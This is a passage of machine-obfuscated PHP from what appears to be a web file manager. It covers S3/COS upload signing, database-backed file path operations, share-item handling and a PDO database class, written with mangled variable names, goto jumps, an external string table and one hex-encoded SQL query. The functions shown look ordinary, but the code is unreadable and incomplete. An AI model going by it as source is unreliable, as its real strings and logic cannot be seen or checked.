(!$spldjavyqw) { return; } goto d÷¡‘»µ´; A‚„ŸÅ¾¶ô: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($òŞºùâÒ) { parent::__construct($òŞºùâÒ); $this->signatureVersion($_SERVER[Îûáû“ş][216]); } public function uploadFormData($ÌÓé›Ÿ«, $‚şÁö = 3600) { $¾ÇóÓé… =& $_SERVER[Îûáû“ş]; $Üıß«ÑĞ = $¾ÇóÓé…[199]; $¬àşÑ¦‡ = $¾ÇóÓé…[232]; $ÈÕíñŒß = $¾ÇóÓé…[1324]; $øí¬Ò½ª = gmdate($¾ÇóÓé…[1325], time() + $‚şÁö); $ıÒúâŠƒ = (string) time() . $¾ÇóÓé…[71] . (string) (time() + $‚şÁö); $Û¨üÅ†§ = array($¾ÇóÓé…[1326] => $øí¬Ò½ª, $¾ÇóÓé…[1327] => array(array($¾ÇóÓé…[1328] => $Üıß«ÑĞ), array($¾ÇóÓé…[1329] => $this->bucket), array($¾ÇóÓé…[1330], $¾ÇóÓé…[1331], $¾ÇóÓé…[12]), array($¾ÇóÓé…[1332] => $ÈÕíñŒß), array($¾ÇóÓé…[1333] => $¬àşÑ¦‡), array($¾ÇóÓé…[1334] => $this->accessKey), array($¾ÇóÓé…[1335] => $ıÒúâŠƒ))); $Û¨üÅ†§ = json_encode($Û¨üÅ†§); $éÈ«±ßë = hash_hmac($¾ÇóÓé…[232], $ıÒúâŠƒ, $this->secret); $«ïÜéÀê = sha1($Û¨üÅ†§); $Ø–º†§Œ = hash_hmac($¾ÇóÓé…[232], $«ïÜéÀê, $éÈ«±ßë); $¢Îùò¼É = array($¾ÇóÓé…[1328] => $Üıß«ÑĞ, $¾ÇóÓé…[1332] => $ÈÕíñŒß, $¾ÇóÓé…[1336] => base64_encode($Û¨üÅ†§), $¾ÇóÓé…[1333] => $¬àşÑ¦‡, $¾ÇóÓé…[1334] => $this->accessKey, $¾ÇóÓé…[1337] => $ıÒúâŠƒ, $¾ÇóÓé…[1338] => $Ø–º†§Œ, $¾ÇóÓé…[182] => $this->getHost()); return $¢Îùò¼É; } public function fileOutLink($åİı‚Ù·) { $†Æ¾ˆ =& $_SERVER[Îûáû“ş]; if (substr($åİı‚Ù·, 0, 7) == $†Æ¾ˆ[1339]) { $åİı‚Ù· = $†Æ¾ˆ[1340] . substr($åİı‚Ù·, 7); } header($†Æ¾ˆ[161] . $åİı‚Ù·); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($À¸µƒ¶–) { $this->pathParse = $À¸µƒ¶–; $this->model = Model($_SERVER[Îûáû“ş][1341]); } public function getPath($çÉ²ûÇÇ) { return trim($çÉ²ûÇÇ, $_SERVER[Îûáû“ş][8]); } public function pathFather($‘ˆ©–íá) { $×ü«Úñ = $this->parse($‘ˆ©–íá); $×ü«Úñ = $this->infoSimple($‘ˆ©–íá); return $×ü«Úñ ? $×ü«Úñ[$_SERVER[Îûáû“ş][432]] : !1; } public function pathThis($Å÷˜áŠÍ) { $‚¢ÂÛÔŒ = $this->infoSimple($Å÷˜áŠÍ); return $‚¢ÂÛÔŒ ? $‚¢ÂÛÔŒ[$_SERVER[Îûáû“ş][32]] : !1; } public function getPathOuter($•€³Ü’) { if (!$•€³Ü’) { return $•€³Ü’; } $Äæğ¯¾ = $this->parse($•€³Ü’); return KodIO::make($Äæğ¯¾[$_SERVER[Îûáû“ş][399]]); } public function copyFolderFromIO($—ÑŸ¼ùÂ, $–®±ú¯, $¾‹ášãº, $”¹Íèøµ, $®“ø´Îü) { $Ï´¢÷‡Ş = $this->model->copyFolderFromIO($—ÑŸ¼ùÂ, $–®±ú¯, $¾‹ášãº, $”¹Íèøµ, $®“ø´Îü); return KodIO::make($Ï´¢÷‡Ş); } public function isParentOf($¿åˆÕ¦, $ÓâÑÎŸš) { return $this->model->isParentOf($¿åˆÕ¦, $ÓâÑÎŸš); } public function mkfile($º¼’õçÜ, $ôıÄ‚éı = '', $ª‡ˆ§®ª = REPEAT_RENAME) { $»ãÎ÷¢¼ =& $_SERVER[Îûáû“ş]; $î­ñù„¨ = $this->parse($º¼’õçÜ); $º¼’õçÜ = $î­ñù„¨[$»ãÎ÷¢¼[399]]; for ($ŸŒÀÛş¨ = 0; $ŸŒÀÛş¨ < count($î­ñù„¨[$»ãÎ÷¢¼[1342]]); $ŸŒÀÛş¨++) { $‡ÁÙæ×† = $î­ñù„¨[$»ãÎ÷¢¼[1342]][$ŸŒÀÛş¨]; if ($ŸŒÀÛş¨ == count($î­ñù„¨[$»ãÎ÷¢¼[1342]]) - 1) { $º¼’õçÜ = $this->model->mkfile($º¼’õçÜ, $‡ÁÙæ×†, $ôıÄ‚éı, $ª‡ˆ§®ª); break; } $º¼’õçÜ = $this->model->mkdir($º¼’õçÜ, $‡ÁÙæ×†, REPEAT_SKIP); } return $this->getPathOuter($º¼’õçÜ); } public function mkdir($…§ú†‘÷, $ıó‰øÛ = REPEAT_SKIP) { $¥âåñÏ™ =& $_SERVER[Îûáû“ş]; $àäÄ“­² = $this->parse($…§ú†‘÷); $…§ú†‘÷ = $àäÄ“­²[$¥âåñÏ™[399]]; for ($šœØ‘İš = 0; $šœØ‘İš < count($àäÄ“­²[$¥âåñÏ™[1342]]); $šœØ‘İš++) { $Ó±º§Ñï = $àäÄ“­²[$¥âåñÏ™[1342]][$šœØ‘İš]; $…§ú†‘÷ = $this->model->mkdir($…§ú†‘÷, $Ó±º§Ñï, $ıó‰øÛ); } return $this->getPathOuter($…§ú†‘÷); } public function copyFile($çÄú©¼, $ÎùôöÁ¬, $ÕÉŸî‚ğ = REPEAT_REPLACE) { $ÍßŒ¥¢¹ =& $_SERVER[Îûáû“ş]; $—¢¦œÚ = $this->parse($ÎùôöÁ¬); $òÜ³­¸ù = $this->model->copy($çÄú©¼, $—¢¦œÚ[$ÍßŒ¥¢¹[399]], $ÕÉŸî‚ğ, $—¢¦œÚ[$ÍßŒ¥¢¹[84]]); return $òÜ³­¸ù ? $this->getPathOuter($òÜ³­¸ù) : !1; } public function moveFile($óÑÃë, $ıà¼ë ‹, $Ò˜¨Ë‹ê = REPEAT_REPLACE) { $çŞ«ëñ· =& $_SERVER[Îûáû“ş]; $°…İŸÙ = $this->parse($ıà¼ë ‹); $°ÍşÓßØ = $this->model->move($óÑÃë, $°…İŸÙ[$çŞ«ëñ·[399]], $Ò˜¨Ë‹ê, $°…İŸÙ[$çŞ«ëñ·[84]]); return $°ÍşÓßØ ? $this->getPathOuter($°ÍşÓßØ) : !1; } public function copy($È“±•ÖÃ, $²ŠÄşåÑ, $‹³ùÀ¸Š = REPEAT_REPLACE, $ê¡³£æ¯ = false) { $¨²€•ªÉ = $this->parse($²ŠÄşåÑ); $¹”ø‡ÛÅ = $this->model->copy($È“±•ÖÃ, $¨²€•ªÉ[$_SERVER[Îûáû“ş][399]], $‹³ùÀ¸Š, $ê¡³£æ¯); return $¹”ø‡ÛÅ ? $this->getPathOuter($¹”ø‡ÛÅ) : !1; } public function moveSameAllow() { } public function move($ò¬Ìï¨, $€áÀ¾º˜, $âÔˆÕ›— = REPEAT_REPLACE, $¹®”¯‰ = false) { $âù©ƒ‹ = $this->parse($€áÀ¾º˜); $Á¿õ° = $this->model->move($ò¬Ìï¨, $âù©ƒ‹[$_SERVER[Îûáû“ş][399]], $âÔˆÕ›—, $¹®”¯‰); return $Á¿õ° ? $this->getPathOuter($Á¿õ°) : !1; } public function remove($‘å÷øâÒ, $Ñ‚´‰¬Ê = true) { return $this->model->remove($‘å÷øâÒ, $Ñ‚´‰¬Ê); } public function rename($îÃİ ˜ò, $ê„õÑÇ¤) { $õŠÁ¡·å = $this->model->rename($îÃİ ˜ò, $ê„õÑÇ¤); return $õŠÁ¡·å ? $this->getPathOuter($îÃİ ˜ò) : $õŠÁ¡·å; } public function size($ã­ÑÖéš) { $ê‹‰ş€© = $this->infoSimple($ã­ÑÖéš); return $ê‹‰ş€© ? $ê‹‰ş€©[$_SERVER[Îûáû“ş][76]] : 0; } public function infoSimple($Ûçñ½Û) { return $this->model->sourceInfo($Ûçñ½Û); } public function info($¶‡Åñı) { return $this->infoParse($¶‡Åñı); } public function infoAuth($Ô·éĞÈÄ) { return $this->infoParse($Ô·éĞÈÄ, !1, !0); } public function infoWithChildren($Á´÷¥ñ€) { return $this->infoParse($Á´÷¥ñ€, !0); } protected function infoParse($Ö»Àšô, $÷ó‘îáÔ = false, $•Ã®å€ó = false) { if (!$÷ó‘îáÔ) { return $this->model->pathInfo($Ö»Àšô, $•Ã®å€ó); } return $this->model->pathInfoMore($Ö»Àšô); } public function infoFull($›Ã…œ†) { $’ãĞÂ® =& $_SERVER[Îûáû“ş]; $™ĞØ»‡­ = explode($’ãĞÂ®[8], $›Ã…œ†); $ÀÄÒú¿š = implode($’ãĞÂ®[8], array_splice($™ĞØ»‡­, 1)); return $this->model->pathInfoByPath($™ĞØ»‡­[0], $ÀÄÒú¿š); } public function hashSimple($®Èêíß¯) { $ÀÎšİĞÇ =& $_SERVER[Îûáû“ş]; $úĞĞÁä = $this->infoWithChildren($®Èêíß¯); return $úĞĞÁä[$ÀÎšİĞÇ[170]][$ÀÎšİĞÇ[177]]; } public function hashMd5($Õ—³µ‡) { $Ü£´†µµ =& $_SERVER[Îûáû“ş]; $ñŠş¡éš = $this->infoWithChildren($Õ—³µ‡); return $ñŠş¡éš[$Ü£´†µµ[170]][$Ü£´†µµ[176]]; } public function exist($„‡Ïåî½) { $ÀùÖ§¨ =& $_SERVER[Îûáû“ş]; $²ùÎ£Î = $this->parse($„‡Ïåî½); if (!$²ùÎ£Î[$ÀùÖ§¨[84]]) { return $this->isFile($„‡Ïåî½) || $this->isFolder($„‡Ïåî½); } $†ÎÇ‰ÒÕ = array($ÀùÖ§¨[401] => $²ùÎ£Î[$ÀùÖ§¨[399]], $ÀùÖ§¨[32] => $²ùÎ£Î[$ÀùÖ§¨[84]]); $×ğõÁ‘— = $this->model->where($†ÎÇ‰ÒÕ)->find(); return $×ğõÁ‘— ? !0 : !1; } public function isFile($–‹Û‘Ùù) { $£‹ĞõÊ™ =& $_SERVER[Îûáû“ş]; $ƒßß‚Ù = $this->infoSimple($–‹Û‘Ùù); return $ƒßß‚Ù && $ƒßß‚Ù[$£‹ĞõÊ™[410]] == $£‹ĞõÊ™[88] ? !1 : !0; } public function isFolder($ëıœã¿) { $òÚñ¯ºĞ =& $_SERVER[Îûáû“ş]; $¾¶¦¡õÒ = $this->infoSimple($ëıœã¿); return $¾¶¦¡õÒ && $¾¶¦¡õÒ[$òÚñ¯ºĞ[410]] == $òÚñ¯ºĞ[88] ? !0 : !1; } public function listPath($°¤üÌÆÑ, $ÄüÕ½­‰ = false) { $ë§’÷Úˆ =& $_SERVER[Îûáû“ş]; if ($°¤üÌÆÑ == $ë§’÷Úˆ[12]) { return !1; } $™óşòÍˆ = array($ë§’÷Úˆ[401] => $°¤üÌÆÑ); if ($ÄüÕ½­‰) { return $this->model->listSource($™óşòÍˆ, -1); } return $this->model->listSource($™óşòÍˆ); } public function has($÷–ğø³é, $ğšçØì = false, $…´§şŸ = null) { $ŠÁëŒğö =& $_SERVER[Îûáû“ş]; $øô»ıµ¸ = $this->infoWithChildren($÷–ğø³é); if ($ğšçØì) { return array($ŠÁëŒğö[208] => $øô»ıµ¸[$ŠÁëŒğö[208]], $ŠÁëŒğö[207] => $øô»ıµ¸[$ŠÁëŒğö[207]]); } return $…´§şŸ ? $øô»ıµ¸[$ŠÁëŒğö[208]] : $øô»ıµ¸[$ŠÁëŒğö[207]]; } public function listAll($ôë—“ñ) { $Õ¯ìÅ«õ = IO::info($this->pathParse[$_SERVER[Îûáû“ş][84]]); if (!$Õ¯ìÅ«õ) { return array(); } return $this->model->listAll($ôë—“ñ); } public function getContent($®´Š”Šğ) { return $this->model->getContent($®´Š”Šğ); } public function setContent($½ĞËÍã, $¥ÂúÌ˜ = '') { return $this->model->setContent($½ĞËÍã, $¥ÂúÌ˜); } public function fileSubstr($°…§À¢‹, $‡îßŸî, $ü°ƒ™Ò€) { return $this->model->fileSubstr($°…§À¢‹, $‡îßŸî, $ü°ƒ™Ò€); } public function download($ÃÕüë¤, $šş´ÌÌş = '') { $Á³£§º = get_path_father($šş´ÌÌş); $˜Ë‡‘÷ü = get_path_this($šş´ÌÌş); $“¨ÎÉÙ† = $this->model->fileInfoGet($ÃÕüë¤); $µ³¨ãĞÁ = IO::copy($“¨ÎÉÙ†[$_SERVER[Îûáû“ş][84]], $Á³£§º, !1, $˜Ë‡‘÷ü); return $µ³¨ãĞÁ; } public function setModifyTime($¬øàËûš, $Óç‰ÑöÚ = '') { $Ï³ëÑĞĞ =& $_SERVER[Îûáû“ş]; if (!$¬øàËûš) { return; } $this->model->where(array($Ï³ëÑĞĞ[417] => $¬øàËûš))->save(array($Ï³ëÑĞĞ[85] => $Óç‰ÑöÚ)); } public function upload($£³‘³é˜, $£îœè¢İ, $•­äßÏ = false, $¨•¡€Û« = REPEAT_REPLACE) { $‘éˆÄññ =& $_SERVER[Îûáû“ş]; $Úçíà = $this->parse($£³‘³é˜); $Æ–òü˜Ä = $this->model->addFile($Úçíà[$‘éˆÄññ[399]], $£îœè¢İ, $Úçíà[$‘éˆÄññ[84]], $•­äßÏ, $¨•¡€Û«); return $this->getPathOuter($Æ–òü˜Ä); } public function uploadFileByID($ÔÆØâÙ­, $ÀÅÉĞ–Ë, $ˆ€ÃåŞ) { $ä¿ÑşùÏ =& $_SERVER[Îûáû“ş]; $‚›•µÃ = $this->parse($ÔÆØâÙ­); $ìâˆÛ­¯ = $this->model->addFileByFileID($‚›•µÃ[$ä¿ÑşùÏ[399]], $ÀÅÉĞ–Ë, $‚›•µÃ[$ä¿ÑşùÏ[84]], $ˆ€ÃåŞ); return $this->getPathOuter($ìâˆÛ­¯); } public function addFileByRemote($ùäÅ·¨Ê, $©Š×ÔÑ, $Èö‹Ú‘§ = array(), $¦ô¾¾“‰ = '', $¡ç·Ë£) { $”ôĞë‘ =& $_SERVER[Îûáû“ş]; $£”ì¡­‹ = $this->parse($ùäÅ·¨Ê); $¦ô¾¾“‰ = empty($¦ô¾¾“‰) ? $£”ì¡­‹[$”ôĞë‘[84]] : $¦ô¾¾“‰; $âÅ§¢ò“ = $this->model->addFileByRemote($£”ì¡­‹[$”ôĞë‘[399]], $©Š×ÔÑ, $¦ô¾¾“‰, $Èö‹Ú‘§, $¡ç·Ë£); return $this->getPathOuter($âÅ§¢ò“); } public function uploadLink($²ƒ†µñ¥, $ÎÛË²Öó = 0) { $¥Î™ĞÀÃ =& $_SERVER[Îûáû“ş]; $«ßù«é = $this->parse($²ƒ†µñ¥); $µ½ÎÎ†» = _get($GLOBALS[$¥Î™ĞÀÃ[7]], $¥Î™ĞÀÃ[1343]); $“ü­ˆè = _get($GLOBALS[$¥Î™ĞÀÃ[7]], $¥Î™ĞÀÃ[1344]); $²ƒ†µñ¥ = Model($¥Î™ĞÀÃ[601])->createFileName($«ßù«é[$¥Î™ĞÀÃ[84]], $µ½ÎÎ†», $“ü­ˆè); return IO::uploadLink($²ƒ†µñ¥, $ÎÛË²Öó); } public function fileNameAuto($…ë ¯Š±, $¡ÔÛúĞ±, $‰»ş±½Á = REPEAT_REPLACE, $˜Á½†Çƒ = false) { return $this->model->fileNameAuto($…ë ¯Š±, $¡ÔÛúĞ±, $‰»ş±½Á, $˜Á½†Çƒ); } public function fileNameExist($±¾Áã›, $Ü˜æºÌê) { return $this->model->fileNameExist($±¾Áã›, $Ü˜æºÌê); } protected function _fileOut($„³áÏÑø, $ÆÁ«¼ = false, $Éò¸àøœ = false, $‘‹ÚÕŠ¹ = '', $ ¢˜ –ä = false) { $ÀÇ­Àç =& $_SERVER[Îûáû“ş]; $Å¨©€ã = $this->model->sourceInfo($„³áÏÑø); if ($Å¨©€ã[$ÀÇ­Àç[410]] == $ÀÇ­Àç[88]) { header($ÀÇ­Àç[1345]); die; } $Ó²ªÒ = $this->model->fileInfoGet($„³áÏÑø); $‘‹ÚÕŠ¹ = $Ó²ªÒ[$ÀÇ­Àç[176]] ? $Ó²ªÒ[$ÀÇ­Àç[176]] : $‘‹ÚÕŠ¹; $ ®Å¥›‘ = isset($GLOBALS[$ÀÇ­Àç[1346]]) ? $GLOBALS[$ÀÇ­Àç[1346]] : $Å¨©€ã[$ÀÇ­Àç[32]]; if ($ ¢˜ –ä) { return IO::fileOutServer($Ó²ªÒ[$ÀÇ­Àç[84]], $ÆÁ«¼, $ ®Å¥›‘, $‘‹ÚÕŠ¹); } IO::fileOut($Ó²ªÒ[$ÀÇ­Àç[84]], $ÆÁ«¼, $ ®Å¥›‘, $‘‹ÚÕŠ¹); } public function fileOut($ëù²ù¡, $ÉÍñ€À¬ = false, $öÒ¡®ş» = false, $Ïâàå±ò = '') { $this->_fileOut($ëù²ù¡, $ÉÍñ€À¬, $öÒ¡®ş», $Ïâàå±ò); } public function fileOutServer($ßÂºÔÉ—, $™˜ôŠ›Å = false, $óÙÇÕÓÛ = false, $Ê„ Õ¹Â = '') { $this->_fileOut($ßÂºÔÉ—, $™˜ôŠ›Å, $óÙÇÕÓÛ, $Ê„ Õ¹Â, !0); } protected function _fileOutImage($üÚÃ¯ÛÍ, $ÕÓ€¯ = 250) { $úÈæ„Ø =& $_SERVER[Îûáû“ş]; $¸ØĞş™ = $this->model->pathInfo($üÚÃ¯ÛÍ); if ($¸ØĞş™[$úÈæ„Ø[410]] == $úÈæ„Ø[88]) { show_json($úÈæ„Ø[1347] . $üÚÃ¯ÛÍ, !1); } $¼ÛºñÉò = $this->model->fileInfoGet($üÚÃ¯ÛÍ); $¼ÛºñÉò[$úÈæ„Ø[32]] = $¸ØĞş™[$úÈæ„Ø[32]]; $¼ÛºñÉò[$úÈæ„Ø[169]] = $¸ØĞş™[$úÈæ„Ø[169]]; $GLOBALS[$úÈæ„Ø[1346]] = $¼ÛºñÉò[$úÈæ„Ø[32]]; $GLOBALS[$úÈæ„Ø[168]] = $¼ÛºñÉò; IO::fileOutImage($¼ÛºñÉò[$úÈæ„Ø[84]], $ÕÓ€¯); } public function fileOutImage($·ô‘¾€, $¿‚°ùü– = 250) { $this->_fileOutImage($·ô‘¾€, $¿‚°ùü–); } public function fileOutImageServer($Â‹€³¤Ä, $£µ“‹ï¨ = 250) { $this->_fileOutImage($Â‹€³¤Ä, $£µ“‹ï¨); } public function link($Ä±’ŸÆò, $ò™šó¶€ = '') { $—ë¶Ÿ°Ü = $this->model->fileInfoGet($Ä±’ŸÆò); return IO::link($—ë¶Ÿ°Ü[$_SERVER[Îûáû“ş][84]], $ò™šó¶€); } protected function parse($Ø·ù¦÷†) { $¿×¹ç²“ =& $_SERVER[Îûáû“ş]; if (strstr($Ø·ù¦÷†, $¿×¹ç²“[8]) === !1) { return array($¿×¹ç²“[419] => intval($Ø·ù¦÷†), $¿×¹ç²“[84] => $¿×¹ç²“[12], $¿×¹ç²“[1342] => array()); } $ğúÑáĞÂ = explode($¿×¹ç²“[8], trim($Ø·ù¦÷†, $¿×¹ç²“[8])); if (count($ğúÑáĞÂ) < 2) { show_tips(clear_html($Ø·ù¦÷†) . $¿×¹ç²“[1348]); } return array($¿×¹ç²“[419] => intval($ğúÑáĞÂ[0]), $¿×¹ç²“[84] => $ğúÑáĞÂ[1], $¿×¹ç²“[1342] => array_slice($ğúÑáĞÂ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($û‡Å») { $this->pathParse = $û‡Å»; $this->model = Model($_SERVER[Îûáû“ş][1341]); } public function getPathOuter($ ×Ÿ—è) { $‹ØÒÛÆª =& $_SERVER[Îûáû“ş]; if (!$ ×Ÿ—è) { return $ ×Ÿ—è; } $™û¦ôÌ€ = $this->parse($ ×Ÿ—è); return trim(KodIO::makeShare($this->pathParse[$‹ØÒÛÆª[399]], $™û¦ôÌ€[$‹ØÒÛÆª[399]]), $‹ØÒÛÆª[8]); } protected function infoParse($Ê†ÜÉ¯, $½¹…ßá­ = false, $¶şööÅó = false) { $±ÏÄÎ¢ı =& $_SERVER[Îûáû“ş]; $æöÈÍßò = $this->pathParse[$±ÏÄÎ¢ı[399]]; $²èÍÁ€ = trim($this->pathParse[$±ÏÄÎ¢ı[1170]], $±ÏÄÎ¢ı[8]); return Action($±ÏÄÎ¢ı[1349])->sharePathInfo($æöÈÍßò, $²èÍÁ€, $½¹…ßá­); } public function infoFull($¬Ù×ğî©) { $´¬…è =& $_SERVER[Îûáû“ş]; $Ş‰¤òÃ = explode($´¬…è[8], trim($¬Ù×ğî©, $´¬…è[8])); if (count($Ş‰¤òÃ) > 1) { $ß¾ù‘úû = implode($´¬…è[8], array_splice($Ş‰¤òÃ, 1)); $…ú°ñ³İ = $this->model->pathInfoByPath($Ş‰¤òÃ[0], $ß¾ù‘úû); if (!$…ú°ñ³İ) { return !1; } $this->pathParse[$´¬…è[1170]] = $…ú°ñ³İ[$´¬…è[402]]; } return $this->infoParse($¬Ù×ğî©); } public function listAll($˜ö¥äî) { $àû„ã™§ =& $_SERVER[Îûáû“ş]; $İÑ›¢¶Ï = IO::info($this->pathParse[$àû„ã™§[84]]); if (!$İÑ›¢¶Ï) { return array(); } $Ñ÷ÉÃé = $this->model->listAll($˜ö¥äî); $ãÕ”òÛ· = Model($àû„ã™§[592])->getInfo($İÑ›¢¶Ï[$àû„ã™§[593]]); foreach ($Ñ÷ÉÃé as &$¢¤®´‹µ) { check_abort(); $¢¤®´‹µ[$àû„ã™§[87]] = Action($àû„ã™§[1349])->_shareItemeParse($¢¤®´‹µ[$àû„ã™§[87]], $ãÕ”òÛ·); } unset($¢¤®´‹µ); return $Ñ÷ÉÃé; } } goto b•Ú›”Ã½±; e–›ì‚…: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($èœ¿†¿€ = '') { $Ÿˆœ­ı£ =& $_SERVER[Îûáû“ş]; if (!class_exists($Ÿˆœ­ı£[916])) { think_exception(think_lang($Ÿˆœ­ı£[14]) . $Ÿˆœ­ı£[917]); } if (!empty($èœ¿†¿€)) { $this->config = $èœ¿†¿€; if (empty($this->config[$Ÿˆœ­ı£[17]])) { $this->config[$Ÿˆœ­ı£[17]] = array(); } } } public function connect($ñ½é¨µæ = '', $¯Í’¤Õ = 0) { $ƒä­‚ß– =& $_SERVER[Îûáû“ş]; if (!isset($this->linkID[$¯Í’¤Õ])) { if (empty($ñ½é¨µæ)) { $ñ½é¨µæ = $this->config; } $¯¯á‡Áˆ = !empty($ñ½é¨µæ[$ƒä­‚ß–[17]][$ƒä­‚ß–[18]]) ? $ñ½é¨µæ[$ƒä­‚ß–[17]][$ƒä­‚ß–[18]] : $this->pconnect; if ($¯¯á‡Áˆ) { $ñ½é¨µæ[$ƒä­‚ß–[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¯Í’¤Õ] = new PDO($ñ½é¨µæ[$ƒä­‚ß–[918]], $ñ½é¨µæ[$ƒä­‚ß–[890]], $ñ½é¨µæ[$ƒä­‚ß–[891]], $ñ½é¨µæ[$ƒä­‚ß–[17]]); } catch (PDOException $ıƒÅŸü˜) { think_exception($ıƒÅŸü˜->getMessage()); } $this->dbType = $this->_getDsnType($ñ½é¨µæ[$ƒä­‚ß–[918]]); if (in_array($this->dbType, array($ƒä­‚ß–[919], $ƒä­‚ß–[920], $ƒä­‚ß–[921], $ƒä­‚ß–[922]))) { think_exception($ƒä­‚ß–[923] . $this->dbType . $ƒä­‚ß–[924] . $this->dbType . $ƒä­‚ß–[925]); } if (!$this->linkID[$¯Í’¤Õ]) { think_exception($ƒä­‚ß–[926]); } try { $this->linkID[$¯Í’¤Õ]->exec($ƒä­‚ß–[927] . think_config($ƒä­‚ß–[893])); } catch (Exception $ıƒÅŸü˜) { } $this->connected = !0; if (1 != think_config($ƒä­‚ß–[22])) { unset($this->config); } } return $this->linkID[$¯Í’¤Õ]; } public function free() { $this->PDOStatement = null; } public function query($‡¢¯…ğ½, $Û›¬ÀÚÒ = array()) { $´º©‘î =& $_SERVER[Îûáû“ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡¢¯…ğ½; if (!empty($Û›¬ÀÚÒ)) { $this->queryStr .= $´º©‘î[928] . print_r($Û›¬ÀÚÒ, !0) . $´º©‘î[929]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($´º©‘î[23], 1); think_status($´º©‘î[24]); $this->PDOStatement = $this->_linkID->prepare($‡¢¯…ğ½); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¾¨äö™– = $this->PDOStatement->execute($Û›¬ÀÚÒ); $this->debug(); if (!1 === $¾¨äö™–) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÌÒÖêçß, $ò÷µšşó = array()) { $ŒëäÚ²í =& $_SERVER[Îûáû“ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌÒÖêçß; if (!empty($ò÷µšşó)) { $this->queryStr .= $ŒëäÚ²í[928] . print_r($ò÷µšşó, !0) . $ŒëäÚ²í[929]; } $ß‡¥îÚù = !1; if ($this->dbType == $ŒëäÚ²í[922]) { if (preg_match($ŒëäÚ²í[930], $this->queryStr, $Ù¢ÃÈÈ€)) { $this->table = think_config($ŒëäÚ²í[931]) . str_ireplace(think_config($ŒëäÚ²í[932]), $ŒëäÚ²í[378], $Ù¢ÃÈÈ€[2]); $ß‡¥îÚù = (bool) $this->query($ŒëäÚ²í[933] . strtoupper($this->table) . $ŒëäÚ²í[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ŒëäÚ²í[25], 1); think_status($ŒëäÚ²í[24]); $this->PDOStatement = $this->_linkID->prepare($ÌÒÖêçß); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¤´Ë‹÷ = $this->PDOStatement->execute($ò÷µšşó); $this->debug(); if (!1 === $¤´Ë‹÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ß‡¥îÚù || preg_match($ŒëäÚ²í[934], $ÌÒÖêçß)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ˆ¼ Ù¯ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ˆ¼ Ù¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ëÓÕíı = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ëÓÕíı) { $this->error(); return !1; } } return !0; } private function getAll() { $ÊãıÔ ı = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÊãıÔ ı); return $ÊãıÔ ı; } public function getFields($ç©³”Ğ) { $¬×ÌõŸƒ =& $_SERVER[Îûáû“ş]; $this->initConnect(!0); if (think_config($¬×ÌõŸƒ[935])) { $ò‘¸ı¡Ş = str_replace($¬×ÌõŸƒ[936], $ç©³”Ğ, think_config($¬×ÌõŸƒ[935])); } else { switch ($this->dbType) { case $¬×ÌõŸƒ[919]: case $¬×ÌõŸƒ[937]: $ò‘¸ı¡Ş = "\123\x45\x4c\105\x43\x54\x20\40\x20\143\x6f\154\x75\x6d\156\x5f\156\x61\x6d\145\40\x61\x73\x20\47\x4e\141\x6d\x65\x27\x2c\40\x20\40\x64\x61\164\x61\137\x74\171\160\145\40\141\163\x20\47\124\x79\x70\x65\x27\x2c\x20\40\x20\x63\157\154\165\x6d\156\137\x64\145\146\141\x75\x6c\x74\x20\x61\x73\40\47\x44\145\x66\141\165\154\164\47\54\x20\x20\40\x69\163\x5f\x6e\x75\154\x6c\141\142\x6c\145\40\x61\163\x20\47\x4e\x75\154\154\47\12\x9\x9\x46\x52\x4f\115\11\151\x6e\146\157\162\x6d\x61\x74\x69\157\x6e\x5f\163\143\x68\145\155\x61\x2e\164\141\142\x6c\145\x73\40\x41\123\x20\164\xa\x9\x9\112\117\x49\116\11\151\156\146\157\x72\x6d\141\x74\x69\157\156\137\x73\x63\x68\x65\x6d\x61\x2e\143\x6f\x6c\x75\155\156\163\40\101\123\x20\x63\12\x9\x9\117\116\x20\x20\x74\56\x74\141\x62\154\x65\x5f\x63\x61\x74\x61\x6c\x6f\x67\40\75\x20\x63\x2e\x74\x61\142\154\x65\137\x63\x61\164\141\154\157\x67\12\x9\11\101\116\104\40\164\x2e\x74\141\x62\154\x65\137\163\x63\150\145\155\141\40\75\x20\143\56\164\141\x62\154\x65\x5f\x73\x63\x68\x65\x6d\x61\xa\11\11\x41\x4e\104\40\164\x2e\x74\x61\142\154\x65\x5f\x6e\141\155\145\x20\75\x20\143\x2e\x74\141\142\154\x65\137\x6e\x61\x6d\x65\xa\11\11\x57\x48\105\x52\x45\40\x20\x20\x74\56\x74\141\x62\x6c\145\137\x6e\x61\x6d\145\x20\x3d\40\x27{$ç©³”Ğ}\x27"; break; case $¬×ÌõŸƒ[938]: $ò‘¸ı¡Ş = $¬×ÌõŸƒ[939] . $ç©³”Ğ . $¬×ÌõŸƒ[940]; break; case $¬×ÌõŸƒ[920]: case $¬×ÌõŸƒ[922]: $ò‘¸ı¡Ş = $¬×ÌõŸƒ[941] . $¬×ÌõŸƒ[942] . $¬×ÌõŸƒ[943] . strtoupper($ç©³”Ğ) . $¬×ÌõŸƒ[944] . strtoupper($ç©³”Ğ) . $¬×ÌõŸƒ[945]; break; case $¬×ÌõŸƒ[946]: $ò‘¸ı¡Ş = $¬×ÌõŸƒ[947] . $ç©³”Ğ . $¬×ÌõŸƒ[948]; break; case $¬×ÌõŸƒ[921]: break; case $¬×ÌõŸƒ[949]: default: $ò‘¸ı¡Ş 